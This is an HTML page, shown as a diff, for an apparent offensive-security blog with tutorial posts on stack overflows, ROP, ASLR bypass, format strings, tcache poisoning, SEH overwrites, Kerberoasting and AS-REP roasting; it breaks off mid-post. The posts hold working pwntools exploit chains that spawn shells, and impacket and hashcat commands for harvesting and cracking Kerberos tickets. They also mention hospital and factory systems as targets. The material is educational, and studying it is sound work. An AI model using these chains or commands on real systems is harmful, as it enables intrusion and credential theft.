@@ -1,0 +1,917 @@
+<title>ret2ricky</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: single-column reading blog — sticky mono header, index list, hash-routed post view. Dark by default; light is opt-in via toggle. */
+  :root {
+    --bg: #0e1116;
+    --surface: #151a21;
+    --surface-2: #1b212a;
+    --fg: #e6edf3;
+    --muted: #8b949e;
+    --accent: #f0624a;
+    --accent-soft: #3a211c;
+    --border: #242c36;
+    --code-bg: #10151c;
+    --code-fg: #d6dee7;
+    --code-dim: #6e7a88;
+    --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+    --font-body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+    --measure: 68ch;
+    color-scheme: dark;
+  }
+  :root[data-theme="light"] {
+    --bg: #faf8f5;
+    --surface: #ffffff;
+    --surface-2: #f3f0ea;
+    --fg: #1a1c20;
+    --muted: #6a7078;
+    --accent: #c23a22;
+    --accent-soft: #e9d9d3;
+    --border: #e4e1da;
+    --code-bg: #f6f3ee;
+    --code-fg: #2a2d33;
+    --code-dim: #9aa0a6;
+    color-scheme: light;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--font-body);
+    line-height: 1.65;
+    font-size: 16px;
+  }
+  body::before {
+    content: ""; position: fixed; inset: 0 0 auto;
+    height: env(safe-area-inset-top, 0px); z-index: 20;
+    background: var(--bg);
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 2px; }
+
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding-left: max(20px, env(safe-area-inset-left, 0px));
+    padding-right: max(20px, env(safe-area-inset-right, 0px));
+  }
+
+  header.site {
+    position: sticky;
+    top: env(safe-area-inset-top, 0px);
+    z-index: 15;
+    background: color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border);
+  }
+  .site-inner {
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; padding-block: 14px;
+  }
+  .brand {
+    font-family: var(--font-mono);
+    font-weight: 700; font-size: 1.05rem; letter-spacing: -0.01em;
+    color: var(--fg); display: inline-flex; align-items: baseline; gap: 0;
+  }
+  .brand:hover { text-decoration: none; }
+  .brand .p { color: var(--accent); }
+  .brand .c { color: var(--accent); animation: blink 1.2s steps(1) infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .brand .c { animation: none; } }
+  .toggle {
+    font-family: var(--font-mono); font-size: 0.78rem;
+    background: var(--surface-2); color: var(--muted);
+    border: 1px solid var(--border); border-radius: 6px;
+    padding: 6px 10px; cursor: pointer;
+  }
+  .toggle:hover { color: var(--fg); border-color: var(--accent); }
+
+  main { padding-block: 40px 72px; }
+
+  /* ---- Index ---- */
+  .lede {
+    font-size: 1.02rem; color: var(--muted); max-width: var(--measure);
+    margin-bottom: 8px;
+  }
+  .lede strong { color: var(--fg); font-weight: 600; }
+  .filterbar {
+    display: flex; flex-wrap: wrap; gap: 8px; margin: 26px 0 30px;
+    padding-bottom: 22px; border-bottom: 1px solid var(--border);
+  }
+  .tag {
+    font-family: var(--font-mono); font-size: 0.72rem;
+    padding: 4px 9px; border-radius: 999px;
+    border: 1px solid var(--border); background: var(--surface);
+    color: var(--muted); cursor: pointer; white-space: nowrap;
+  }
+  .tag[aria-pressed="true"] {
+    color: var(--accent); border-color: var(--accent); background: var(--accent-soft);
+  }
+  .tag:hover { color: var(--fg); }
+
+  .postlist { display: flex; flex-direction: column; gap: 2px; }
+  .entry {
+    display: grid; grid-template-columns: 108px 1fr; gap: 18px;
+    padding: 20px 10px; border-radius: 10px;
+    border: 1px solid transparent; text-decoration: none; color: inherit;
+  }
+  .entry:hover { background: var(--surface); border-color: var(--border); text-decoration: none; }
+  .entry .date {
+    font-family: var(--font-mono); font-size: 0.76rem; color: var(--muted);
+    padding-top: 4px; font-variant-numeric: tabular-nums;
+  }
+  .entry h2 {
+    font-size: 1.12rem; font-weight: 600; line-height: 1.3; margin: 0 0 6px;
+    text-wrap: balance; color: var(--fg);
+  }
+  .entry:hover h2 { color: var(--accent); }
+  .entry .excerpt { color: var(--muted); font-size: 0.92rem; margin: 0 0 10px; }
+  .entry .tags { display: flex; flex-wrap: wrap; gap: 6px; }
+  .entry .tags span {
+    font-family: var(--font-mono); font-size: 0.68rem; color: var(--muted);
+  }
+  .entry .tags span::before { content: "#"; opacity: 0.6; }
+
+  @media (max-width: 540px) {
+    .entry { grid-template-columns: 1fr; gap: 6px; }
+    .entry .date { padding-top: 0; }
+  }
+
+  /* ---- Post ---- */
+  #postview { display: none; }
+  .back {
+    font-family: var(--font-mono); font-size: 0.8rem; color: var(--muted);
+    display: inline-flex; align-items: center; gap: 6px; margin-bottom: 28px;
+  }
+  .back:hover { color: var(--accent); text-decoration: none; }
+  .post-head { margin-bottom: 30px; padding-bottom: 24px; border-bottom: 1px solid var(--border); }
+  .post-meta {
+    font-family: var(--font-mono); font-size: 0.76rem; color: var(--muted);
+    display: flex; flex-wrap: wrap; gap: 14px; margin-bottom: 14px;
+    font-variant-numeric: tabular-nums;
+  }
+  .post-head h1 {
+    font-size: clamp(1.6rem, 4.5vw, 2.15rem); line-height: 1.18; margin: 0;
+    letter-spacing: -0.02em; text-wrap: balance; font-weight: 700;
+  }
+  article.content { max-width: var(--measure); }
+  article.content p { margin: 0 0 18px; }
+  article.content h3 {
+    font-size: 1.2rem; margin: 34px 0 12px; font-weight: 650; letter-spacing: -0.01em;
+  }
+  article.content h4 {
+    font-size: 0.98rem; margin: 24px 0 10px; font-weight: 650; color: var(--fg);
+    font-family: var(--font-mono); letter-spacing: -0.01em;
+  }
+  article.content ul, article.content ol { margin: 0 0 18px; padding-left: 22px; }
+  article.content li { margin-bottom: 7px; }
+  article.content strong { color: var(--fg); font-weight: 650; }
+  article.content code {
+    font-family: var(--font-mono); font-size: 0.86em;
+    background: var(--code-bg); color: var(--accent);
+    padding: 2px 5px; border-radius: 4px;
+  }
+  article.content pre {
+    background: var(--code-bg); border: 1px solid var(--border);
+    border-radius: 10px; padding: 16px 18px; overflow-x: auto;
+    margin: 0 0 22px; min-width: 0;
+  }
+  article.content pre code {
+    background: none; color: var(--code-fg); padding: 0; font-size: 0.82rem; line-height: 1.6;
+  }
+  article.content pre code .cm { color: var(--code-dim); }
+  article.content blockquote {
+    margin: 0 0 20px; padding: 2px 0 2px 18px;
+    border-left: 3px solid var(--accent); color: var(--muted); font-style: italic;
+  }
+  article.content table {
+    width: 100%; border-collapse: collapse; margin: 0 0 22px; font-size: 0.86rem;
+  }
+  article.content th, article.content td {
+    text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--border);
+  }
+  article.content th { color: var(--fg); font-family: var(--font-mono); font-size: 0.78rem; }
+  .tablewrap { overflow-x: auto; margin: 0 0 22px; }
+  .tablewrap table { margin: 0; }
+  .callout {
+    background: var(--surface); border: 1px solid var(--border);
+    border-left: 3px solid var(--accent); border-radius: 8px;
+    padding: 14px 16px; margin: 0 0 22px; font-size: 0.92rem; color: var(--muted);
+  }
+  .callout strong { color: var(--fg); }
+  .post-foot {
+    margin-top: 44px; padding-top: 24px; border-top: 1px solid var(--border);
+    font-family: var(--font-mono); font-size: 0.82rem; color: var(--muted);
+  }
+  footer.site {
+    border-top: 1px solid var(--border); padding-block: 26px;
+  }
+  footer.site .wrap {
+    display: flex; flex-wrap: wrap; gap: 6px 18px; justify-content: space-between;
+    font-family: var(--font-mono); font-size: 0.76rem; color: var(--muted);
+  }
+  #store { display: none; }
+</style>
+
+<header class="site">
+  <div class="wrap site-inner">
+    <a href="#index" class="brand" id="brandlink">ret2<span class="p">ricky</span><span class="c">_</span></a>
+    <button class="toggle" id="themeToggle" type="button" aria-label="Toggle color theme">theme</button>
+  </div>
+</header>
+
+<main class="wrap">
+  <section id="indexview">
+    <p class="lede"><strong>Offensive security notes.</strong> Exploit development, Active Directory and web attack paths, reverse engineering, and CTF writeups.</p>
+    <div class="filterbar" id="filterbar"></div>
+    <div class="postlist" id="postlist"></div>
+  </section>
+
+  <section id="postview">
+    <a href="#index" class="back">&larr; all posts</a>
+    <div class="post-head">
+      <div class="post-meta" id="pvMeta"></div>
+      <h1 id="pvTitle"></h1>
+    </div>
+    <article class="content" id="pvBody"></article>
+    <div class="post-foot">&mdash; ret2ricky</div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <span>ret2ricky</span>
+    <span>exploit dev &middot; red team &middot; reverse engineering</span>
+  </div>
+</footer>
+
+<!-- ============ POST STORE ============ -->
+<div id="store">
+
+<article data-slug="stack-overflow-crash-to-control" data-title="Stack Buffer Overflows: From Crash to Control" data-date="2026-09-08" data-tags="exploit-dev,binary,fundamentals" data-excerpt="A segfault is where the work starts, not where it ends. Walking the full path from a crashing input to a controlled instruction pointer, with the x86-64 stack frame laid out byte by byte.">
+<p>Almost everyone starting out in exploit development hits the same wall: they overflow a buffer, the program crashes, and they declare victory. A crash is a denial of service. The interesting question is whether the crash is <em>controllable</em> &mdash; whether you can steer the corruption into an outcome you choose. That gap, between "it crashed" and "I control the instruction pointer," is the whole discipline in miniature.</p>
+
+<h3>Why the stack is corruptible at all</h3>
+<p>On x86-64, local variables, saved registers, and the return address all live together on the stack, growing downward from high addresses to low. A <code>call</code> instruction pushes the address of the next instruction (the return address) onto the stack before jumping into the function. When the function finishes, <code>ret</code> pops that address back into <code>rip</code>. Everything hinges on that saved value being intact.</p>
+<p>A fixed-size buffer written without bounds checking grows <em>upward</em> in memory, toward the saved return address. Overflow it far enough and you walk right over the saved RBP and then the saved RIP. The classic sin:</p>
+<pre><code><span class="cm">// 64-byte buffer, unbounded copy — the canonical bug</span>
+void handle(char *input) {
+    char buf[64];
+    strcpy(buf, input);   <span class="cm">// no length check; copies until NUL</span>
+}</code></pre>
+<p>Here is the frame at the moment <code>handle</code> is about to return, with a 64-byte buffer:</p>
+<pre><code>high addr   +------------------------+
+            |   saved return addr    |  &lt;- overwrite this to control rip
+            +------------------------+
+            |   saved rbp (8 bytes)  |
+            +------------------------+
+            |                        |
+            |   char buf[64]         |  &lt;- strcpy starts writing here
+            |                        |
+low addr    +------------------------+  &lt;- rsp</code></pre>
+<p>If <code>input</code> is longer than <code>64 + 8</code> bytes, byte 73 onward lands on the saved return address. The moment <code>ret</code> executes, the CPU jumps wherever those eight bytes point.</p>
+
+<h3>Finding the exact offset</h3>
+<p>Do not count by hand &mdash; you will be off by a few bytes and waste an hour. Use a De Bruijn (cyclic) pattern: a sequence where every substring of a given length is unique, so the four or eight bytes that land in the crashed register tell you precisely how far into your input they came from.</p>
+<pre><code>$ cyclic 200 &gt; crash.txt          <span class="cm"># generate a 200-byte unique pattern</span>
+$ gdb ./target
+(gdb) run &lt; crash.txt
+Program received signal SIGSEGV, Segmentation fault.
+(gdb) info registers rsp rip
+rsp  0x7fffffffe3a8  "faaagaaahaaa..."
+(gdb) cyclic -l 0x6161616166616166   <span class="cm"># feed the value from the crash</span>
+72                                   <span class="cm"># &lt;- the offset: 72 bytes of padding</span></code></pre>
+<p>Now the layout of the exploit is fixed: 72 bytes of filler, then the next 8 bytes overwrite the saved return address.</p>
+
+<h3>What comes after control</h3>
+<p>Owning <code>rip</code> is the pivot point, not the finish line. Where you aim it depends entirely on the binary's mitigations, which you check before writing a single byte of payload:</p>
+<div class="tablewrap"><table>
+<tr><th>Mitigation state</th><th>Technique</th></tr>
+<tr><td>No NX, no canary</td><td>Jump straight to shellcode on the stack</td></tr>
+<tr><td>NX on, no PIE</td><td>ret2libc / ROP with static gadget addresses</td></tr>
+<tr><td>NX + PIE + ASLR</td><td>Leak an address first, then ROP (two-stage)</td></tr>
+<tr><td>Stack canary present</td><td>Leak or brute the canary before you reach RIP</td></tr>
+</table></div>
+<pre><code>$ checksec ./target
+RELRO: Partial | Canary: No | NX: enabled | PIE: No PIE</code></pre>
+<p>That <code>checksec</code> output is a map of the next three posts: NX-enabled means no stack shellcode, so you pivot to return-oriented programming; PIE-disabled means gadget addresses are static, so no leak is required <em>yet</em>. Each mitigation adds a prerequisite rather than a wall.</p>
+
+<p class="callout"><strong>Mental model:</strong> the overflow does not "break" the program. It hands you a write primitive that happens to reach the control-flow metadata. Treat it like a tool with a known reach, not an accident &mdash; and always run <code>checksec</code> before you theorize about payloads.</p>
+</article>
+
+<article data-slug="rop-fundamentals" data-title="ROP: Exploiting When Your Shellcode Won&#39;t Run" data-date="2026-08-19" data-tags="exploit-dev,binary,rop" data-excerpt="Non-executable stacks killed classic shellcode. Return-oriented programming builds the payload out of code already in the binary — gadgets, chains, and the calling convention that makes it all work.">
+<p>Once DEP/NX marks the stack non-executable, dropping shellcode and jumping to it stops working: the CPU faults the instant it tries to execute a data page. Return-oriented programming (ROP) answers this by never introducing new code at all. Instead you chain tiny snippets of code that already exist in the binary or its libraries &mdash; each snippet ending in <code>ret</code> &mdash; into an arbitrary computation.</p>
+
+<h3>What a gadget actually is</h3>
+<p>A gadget is a short instruction sequence ending in <code>ret</code>, for example <code>pop rdi ; ret</code>. The <code>ret</code> is the engine of the whole technique: it pops the next 8 bytes off the stack into <code>rip</code> and jumps there. Because a buffer overflow puts <em>you</em> in control of the stack, you control the entire sequence of gadgets that run, one <code>ret</code> handing off to the next.</p>
+<p>Gadgets do not have to be intended instructions. x86 is a variable-length instruction set, so you can often <em>decode into the middle</em> of a legitimate instruction and find a useful gadget that the compiler never emitted on purpose. Tools enumerate these for you:</p>
+<pre><code>$ ropper --file ./target --search "pop rdi"
+0x0000000000401263: pop rdi; ret;
+$ ropper --file ./target --search "pop rsi"
+0x0000000000401261: pop rsi; pop r15; ret;   <span class="cm"># note the extra pop — account for it</span></code></pre>
+
+<h3>Thinking in the calling convention</h3>
+<p>On x86-64 System V, the first six integer arguments go in <code>rdi, rsi, rdx, rcx, r8, r9</code>. A ROP chain to call a function is therefore just "load the argument registers, then return into the function." Calling <code>system("/bin/sh")</code> needs exactly one argument in <code>rdi</code>:</p>
+<pre><code>from pwn import *
+
+offset   = 72
+pop_rdi  = 0x401263           <span class="cm"># pop rdi; ret</span>
+binsh    = 0x404050           <span class="cm"># address of the "/bin/sh" string</span>
+system   = 0x401050           <span class="cm"># system@plt</span>
+
+payload  = b"A" * offset      <span class="cm"># fill to saved RIP</span>
+payload += p64(pop_rdi)       <span class="cm"># rip -&gt; this gadget</span>
+payload += p64(binsh)         <span class="cm">//  pop rdi = &amp;"/bin/sh"</span>
+payload += p64(system)        <span class="cm"># ret into system()</span></code></pre>
+<p>Read it top-down as the CPU will execute it: land on <code>pop rdi ; ret</code>, which pops <code>&amp;"/bin/sh"</code> into <code>rdi</code> and returns into <code>system</code>, which now sees its argument exactly where the ABI says it should be.</p>
+
+<h4>The movaps gotcha</h4>
+<p>One alignment trap bites everyone once. Many libc functions use SSE instructions like <code>movaps</code>, which require a 16-byte-aligned stack. If your chain lands <code>system</code> on a misaligned <code>rsp</code>, it crashes <em>inside</em> libc and you waste an afternoon blaming your offsets. The fix is a single extra <code>ret</code> gadget to realign:</p>
+<pre><code>ret = 0x40101a               <span class="cm"># a bare "ret" — nudges rsp by 8 to realign</span>
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(ret)          <span class="cm"># 16-byte alignment before the call</span>
+payload += p64(system)</code></pre>
+
+<blockquote>ROP stops feeling like black magic the moment you see it as "calling functions, with extra steps." The remaining problem is addresses: with ASLR on, you do not know where <code>system</code> or your gadgets live. That is the next post.</blockquote>
+</article>
+
+<article data-slug="defeating-aslr-dep" data-title="Defeating ASLR and DEP in Practice" data-date="2026-07-28" data-tags="exploit-dev,binary,mitigations" data-excerpt="Modern mitigations don't make exploitation impossible — they make it a two-step process. Leak an address to beat ASLR, then reuse existing code to beat DEP. The structure behind nearly every memory-corruption exploit.">
+<p>DEP and ASLR are discussed together because together they force one specific exploitation shape. DEP (NX) says "you cannot execute data as code." ASLR says "you do not know where anything is." Beat them in the right order and both collapse into a routine two-stage exploit.</p>
+
+<h3>Why offsets survive randomization</h3>
+<p>ASLR randomizes the <em>base address</em> where a module loads, but the layout <em>within</em> a module is fixed at compile time. The distance from the start of libc to <code>system</code> never changes for a given build. So if you can leak a single real runtime address belonging to a module, you can compute every other address in it by adding or subtracting known offsets. One leak defeats the whole module's randomization.</p>
+
+<h3>Step one: the leak</h3>
+<p>The leak is the creative part &mdash; any primitive that prints a pointer will do. A common one on partial-RELRO binaries is to ROP a call to <code>puts(puts@got)</code>: the GOT holds the resolved runtime address of <code>puts</code>, and you ask <code>puts</code> to print it to you.</p>
+<pre><code>from pwn import *
+elf  = ELF("./target")
+libc = ELF("./libc.so.6")
+
+<span class="cm"># Stage 1: leak libc's runtime base via the GOT</span>
+rop  = b"A"*72
+rop += p64(pop_rdi) + p64(elf.got["puts"])   <span class="cm"># arg = &amp;puts@GOT</span>
+rop += p64(elf.plt["puts"])                  <span class="cm"># print it</span>
+rop += p64(elf.sym["main"])                  <span class="cm"># return to main for round two</span>
+p.sendline(rop)
+
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc.address = leak - libc.sym["puts"]       <span class="cm"># ASLR defeated for libc</span>
+log.info("libc base: %#x", libc.address)</code></pre>
+<p>Returning into <code>main</code> at the end is the trick that makes two-stage exploitation ergonomic: the program loops back to the vulnerable function, and now you fire a second payload with every libc address known.</p>
+
+<h3>Step two: the exploit</h3>
+<p>With <code>libc.address</code> populated, pwntools resolves symbols to real runtime addresses for you. DEP is irrelevant because you execute only libc's own code; ASLR is irrelevant because you leaked the base.</p>
+<pre><code>rop2  = b"A"*72
+rop2 += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
+rop2 += p64(ret)                              <span class="cm"># movaps alignment</span>
+rop2 += p64(libc.sym["system"])
+p.sendline(rop2)
+p.interactive()                               <span class="cm"># shell</span></code></pre>
+
+<p class="callout"><strong>Engagement takeaway:</strong> a bug that only leaks memory is often triaged as "low severity" in isolation. Paired with a write primitive it becomes the enabling half of full code execution. When you find an info-leak, reassess every other finding in the report with the leak in hand &mdash; severity is about chains, not individual bugs.</p>
+</article>
+
+<article data-slug="format-string-bugs" data-title="Format String Bugs Are Still a Thing" data-date="2026-07-02" data-tags="exploit-dev,binary,web" data-excerpt="printf(user_input) is a read AND write primitive hiding in plain sight — a leak for defeating ASLR and an arbitrary write for hijacking control flow. Still shipping in 2026, usually in logging code.">
+<p>Every year I am told format string bugs are extinct, and every year one turns up &mdash; almost always in logging or error-handling code where a developer passed a user-controlled string straight into a function's format argument. The root cause is dead simple:</p>
+<pre><code>printf(user_input);          <span class="cm">// vulnerable: user controls the format string</span>
+printf("%s", user_input);    <span class="cm">// correct: user data is an argument, not the format</span></code></pre>
+<p>Why does the first line matter so much? Because <code>printf</code> reads its arguments from registers and the stack based on the format specifiers it sees. If the attacker controls those specifiers, they control which memory <code>printf</code> reads &mdash; and, through <code>%n</code>, which memory it <em>writes</em>.</p>
+
+<h3>Read primitive: leaking the stack</h3>
+<p>Each conversion specifier makes <code>printf</code> consume another argument slot. Supplying a row of <code>%p</code> walks the stack and dumps raw values &mdash; saved pointers, canaries, and libc addresses included. That is a ready-made ASLR defeat.</p>
+<pre><code>$ ./target
+%p.%p.%p.%p.%p.%p.%p.%p
+0x7fffffffe3a0.0x7f...c0.0x401234.(nil).0x4141...  <span class="cm"># stack + pointers leak out</span></code></pre>
+<p>Use positional specifiers to grab an exact slot once you have counted the offset to your own input: <code>%7$p</code> prints the seventh argument directly, which is how you turn "a wall of hex" into "the one pointer I need."</p>
+
+<h3>Write primitive: %n</h3>
+<p>The specifier everyone forgets: <code>%n</code> writes the number of bytes printed <em>so far</em> to the address held in the corresponding argument. Control that address (place it in your input, reference it by position) and control the byte count (via field-width padding like <code>%100c</code>), and you have an arbitrary write.</p>
+<pre><code><span class="cm"># Overwrite a 2-byte value at target_addr using %hn, split writes with pwntools</span>
+from pwn import *
+payload = fmtstr_payload(offset, {target_addr: new_value})
+p.sendline(payload)</code></pre>
+<p>The usual target is a GOT entry &mdash; overwrite <code>exit@got</code> or <code>printf@got</code> with the address of <code>system</code> or a one-gadget, and the next call to that function runs your code. <code>fmtstr_payload</code> handles the tedious byte-splitting; understanding it by hand once is what lets you tune it when the automation chokes on bad characters.</p>
+
+<p class="callout"><strong>Where to hunt:</strong> grep the codebase for logging wrappers and <code>syslog</code>/<code>fprintf</code> calls whose format argument is a variable. The bug loves to hide one layer below <code>printf</code>, in a helper like <code>log_error(msg)</code> that calls <code>fprintf(stderr, msg)</code>.</p>
+</article>
+
+<article data-slug="heap-tcache-poisoning" data-title="Heap Exploitation: tcache Poisoning Explained" data-date="2026-06-11" data-tags="exploit-dev,binary,heap" data-excerpt="The stack is where you learn exploitation; the heap is where you earn it. A clean walkthrough of tcache poisoning on modern glibc, including the pointer-mangling that newer versions added.">
+<p>Stack overflows are linear and visual. The heap is a living allocator, and exploiting it means manipulating the allocator's own bookkeeping rather than overwriting a return address directly. On modern glibc the first stop is the tcache &mdash; a per-thread cache of recently freed chunks, built for speed and historically light on security checks.</p>
+
+<h3>How the tcache works</h3>
+<p>Each tcache bin is a singly linked list of free chunks of one size class, up to seven entries. When you <code>free</code> a small chunk, glibc stores a pointer to the <em>next</em> free chunk of that size in the first 8 bytes of the freed chunk's user data. When you <code>malloc</code> that size again, it pops the head of the list and returns it.</p>
+<pre><code>a = malloc(0x40);  b = malloc(0x40);
+free(a);           <span class="cm">// tcache[0x40]: a</span>
+free(b);           <span class="cm">// tcache[0x40]: b -&gt; a   (b's fd points to a)</span></code></pre>
+
+<h3>The poison</h3>
+<p>If you have a use-after-free or an overflow into a freed chunk, you can overwrite that stored "next" pointer. glibc trusts it and will hand your forged pointer back on a future allocation &mdash; giving you an allocation at an arbitrary address.</p>
+<pre><code><span class="cm">// b is freed; UAF lets us edit its fd pointer</span>
+edit(b, p64(target_addr));   <span class="cm">// tcache[0x40]: b -&gt; target_addr</span>
+malloc(0x40);                <span class="cm">// returns b</span>
+void *p = malloc(0x40);      <span class="cm">// returns target_addr — arbitrary chunk</span></code></pre>
+<p>An arbitrary allocation becomes an arbitrary write the moment you fill the returned chunk. Classic targets: <code>__free_hook</code> or <code>__malloc_hook</code> on older glibc (overwrite with <code>system</code>, then free a chunk containing <code>"/bin/sh"</code>), or a saved return address if you can point the allocation at the stack.</p>
+
+<h4>What changed in newer glibc</h4>
+<p>glibc 2.32+ added <strong>safe-linking</strong>: the fd pointer is mangled as <code>fd ^ (chunk_addr &gt;&gt; 12)</code>. You can no longer write a raw target address &mdash; you must know the chunk's own address to compute the mangled value. In practice this means you need a heap leak first, then:</p>
+<pre><code>mangled = target_addr ^ (chunk_addr &gt;&gt; 12)
+edit(b, p64(mangled))        <span class="cm"># survives safe-linking</span></code></pre>
+<p>The hooks were also removed in glibc 2.34, which pushed the community toward other targets like <code>__exit_funcs</code> / the <code>tls_dtor_list</code> or FSOP (file-stream-oriented programming) on <code>_IO_FILE</code> structures. The technique did not die; the target list shifted.</p>
+
+<p class="callout"><strong>Advice:</strong> draw the allocator state as boxes and arrows on paper before writing exploit code. Every heap bug I have solved cleanly, I drew first; every one I rushed, I debugged for hours.</p>
+</article>
+
+<article data-slug="windows-seh-overwrites" data-title="Windows SEH Overwrites for Reliable RCE" data-date="2026-05-20" data-tags="exploit-dev,windows,binary" data-excerpt="Structured Exception Handling turns a crash into a second control-flow primitive on Windows. An old technique that still lands on the legacy enterprise software running on factory floors and hospital VLANs.">
+<p>On Windows (x86), Structured Exception Handling maintains a linked list of exception-handler records on the stack. When an exception fires, the OS walks that list and calls each handler's function pointer. If a buffer overflow reaches an SEH record, you control where the OS jumps when the very crash you caused gets dispatched &mdash; a second, independent path to <code>eip</code> even when a stack cookie protects the normal return address.</p>
+
+<h3>The SEH record</h3>
+<p>Each record is two 4-byte fields on the stack: a pointer to the <em>next</em> SEH record, and a pointer to the <em>handler</em> function. Overflow far enough to overwrite both and you own the handler that runs on the next exception &mdash; which your overflow usually triggers for free by corrupting something downstream.</p>
+<pre><code>+---------------------+
+| next SEH record ptr |  &lt;- 4 bytes you control (nSEH)
++---------------------+
+| handler function ptr|  &lt;- 4 bytes you control (SEH)
++---------------------+</code></pre>
+
+<h3>The POP POP RET trick</h3>
+<p>You do not jump straight to shellcode, because when the handler is called the stack is not arranged to let you. The standard technique overwrites the handler with the address of a <code>POP POP RET</code> gadget. Those two pops discard values off the stack and the <code>ret</code> lands execution on the <em>nSEH</em> field &mdash; the 4 bytes you also control &mdash; where you place a short jump over the handler pointer into your shellcode.</p>
+<pre><code>from struct import pack
+nseh = b"\xeb\x06\x90\x90"      <span class="cm"># short jmp +6, over the SEH ptr, into shellcode</span>
+seh  = pack("&lt;I", pop_pop_ret) <span class="cm"># address of POP POP RET (from a non-SafeSEH module)</span>
+payload  = b"A"*offset + nseh + seh + shellcode</code></pre>
+<p>Finding the offset to the SEH record is the same cyclic-pattern process as a normal overflow, except you read the overwritten SEH chain in the debugger (in WinDbg, <code>!exchain</code>) rather than the faulting <code>eip</code>.</p>
+
+<h3>Why it still matters</h3>
+<p>SafeSEH (validates handlers against a registered table) and SEHOP (validates the integrity of the chain) largely kill this on modern, properly compiled binaries. But the <code>POP POP RET</code> only needs to come from <em>one</em> loaded module without SafeSEH &mdash; and legacy enterprise software is full of them. The SCADA HMI on a factory floor, the imaging client on a hospital VLAN, the twelve-year-old line-of-business app nobody will recompile: these are exactly the targets where SEH overwrites still pop a shell in 2026.</p>
+<pre><code>0:000&gt; !py mona modules        <span class="cm"># in WinDbg with mona.py: list modules + protections</span>
+0:000&gt; !py mona seh            <span class="cm"># find POP POP RET gadgets in non-SafeSEH modules</span></code></pre>
+
+<p class="callout"><strong>Check first:</strong> always enumerate module protections before assuming a technique is dead. "The mitigation exists" and "the mitigation covers every loaded module" are very different statements.</p>
+</article>
+
+<article data-slug="kerberoasting" data-title="Kerberoasting: Cracking Service Accounts From a Foothold" data-date="2026-04-29" data-tags="active-directory,post-exploitation" data-excerpt="Any domain user can request a crackable ticket for any service account — no special rights required. How the Kerberos exchange leaks the hash, why service accounts fall, and what detection actually works.">
+<p>Kerberoasting is one of the first moves worth trying from any low-privileged domain foothold, because it requires no special permissions. Any authenticated user can request a service ticket for any account with a Service Principal Name (SPN), and part of that ticket is encrypted with the service account's password-derived key. Request it, extract it, crack it offline.</p>
+
+<h3>Why the ticket is crackable</h3>
+<p>When a user wants to access a service, they ask the Key Distribution Center for a TGS (ticket-granting service) ticket for that service's SPN. The KDC encrypts part of that ticket with the <em>service account's</em> NTLM hash (for RC4) or AES key. The requesting user never needs to actually talk to the service &mdash; just receiving the ticket is enough, and nothing about the request looks abnormal to the DC beyond one ticket issuance.</p>
+<pre><code><span class="cm"># From Linux with impacket — dump TGS hashes for every SPN account</span>
+GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/lowpriv:Password1
+
+ServicePrincipalName  Name       MemberOf              PasswordLastSet
+--------------------  ---------  --------------------  -------------------
+MSSQLSvc/sql01:1433   svc_sql    CN=SQLAdmins,...      2019-03-11 ...
+$krb5tgs$23$*svc_sql$CORP.LOCAL$...   <span class="cm"># &lt;- the crackable blob</span></code></pre>
+
+<h3>Cracking</h3>
+<p>Those <code>$krb5tgs$</code> blobs crack entirely offline &mdash; no lockout, no further noise against the DC. Request RC4-encrypted tickets (hashcat mode 13100) where you can; they crack far faster than AES (19700).</p>
+<pre><code>$ hashcat -m 13100 spns.txt rockyou.txt -r rules/best64.rule
+$ hashcat -m 13100 spns.txt -a 3 '?u?l?l?l?l?l?l?d?d'   <span class="cm"># targeted mask when wordlists fail</span></code></pre>
+
+<h3>Why service accounts fall so often</h3>
+<p>Service accounts predate good password hygiene and rarely rotate. "Sql$vc2019" feels secure to the admin who set it and falls in seconds to a rule-based crack. They are also routinely over-privileged &mdash; it is common to find a kerberoastable account that is a member of a privileged group, turning one cracked ticket into a direct path toward Domain Admin. The combination of weak human-chosen passwords and excessive rights is what makes it such a high-value technique once you have a foothold.</p>
+
+<p class="callout"><strong>Defender moves that work:</strong> use Group Managed Service Accounts (gMSAs) with 120-character machine-generated passwords, or enforce 25+ character passwords where gMSAs are not possible; disable RC4 for Kerberos; and alert on a single principal requesting many distinct SPN tickets in a short window (event 4769 with RC4 encryption type is the signal).</p>
+</article>
+
+<article data-slug="asrep-roasting" data-title="AS-REP Roasting and the Pre-Auth You Forgot to Enforce" data-date="2026-04-07" data-tags="active-directory,post-exploitation" data-excerpt="Accounts without Kerberos pre-authentication hand out crackable material to anyone who asks — sometimes with no credentials at all. The pre-foothold cousin of Kerberoasting.">
+<p>Kerberoasting needs a foothold. AS-REP roasting sometimes needs nothing but a valid username. If an account has "Do not require Kerberos pre-authentication" set, the KDC will return an AS-REP &mdash; encrypted with that user's password-derived key &mdash; to <em>any</em> unauthenticated requester. That is crackable material handed out at the front door.</p>
+
+<h3>Why pre-auth exists, and why it gets disabled</h3>
+<p>Normally, Kerberos pre-authentication requires the client to prove it knows the password (by encrypting a timestamp) <em>before</em> the KDC returns anything encrypted with that password. That proof is what stops an attacker from harvesting AS-REPs for offline cracking. Pre-auth gets disabled for legacy application compatibility &mdash; some old client or appliance cannot perform it &mdash; and then the exception is forgotten for years.</p>
+<pre><code><span class="cm"># With a user list and no credentials at all</span>
+GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass -format hashcat
+
+$krb5asrep$23$svc_legacy@CORP.LOCAL:...   <span class="cm"># crackable, no auth required</span>
+
